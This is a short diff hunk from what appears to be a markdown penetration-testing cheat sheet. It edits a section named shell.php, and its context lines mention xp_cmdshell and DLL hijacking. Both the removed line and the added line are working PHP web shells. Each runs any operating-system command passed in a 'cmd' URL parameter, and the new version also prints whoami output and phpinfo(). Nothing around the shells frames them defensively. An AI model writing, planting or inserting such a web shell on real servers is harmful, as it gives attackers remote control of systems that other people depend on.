@@ -185,7 +185,7 @@ xp_cmdshell 'COMMAND';
 
 shell.php
 ```php
-<?php echo "Shell: ";system($_GET['cmd']); phpinfo();?>
+<?php echo "<br/><center><h1>"; system('whoami'); echo "</h1></center>"; echo "<br/><br/>"; if(isset($_GET['cmd'])){system($_GET['cmd']); echo "<br/><br/>";} phpinfo(); ?>
 ```
 
 ### DLL Hijacking
